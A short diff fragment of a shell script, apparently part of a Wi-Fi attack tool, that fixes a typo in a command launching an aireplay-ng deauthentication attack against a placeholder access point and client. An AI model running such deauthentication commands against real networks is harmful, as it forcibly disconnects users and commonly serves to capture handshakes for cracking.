@@ -28,6 +28,6 @@ kill $!
 
 echo "Deautheticating pilot:" & sleep 2
 
-gnome-terminal -x aireplay -ng -0 2 -a [BSSID] -c [STATION]  & sleep 5
+gnome-terminal -x aireplay-ng -0 2 -a [BSSID] -c [STATION]  & sleep 5
 
 kill $!
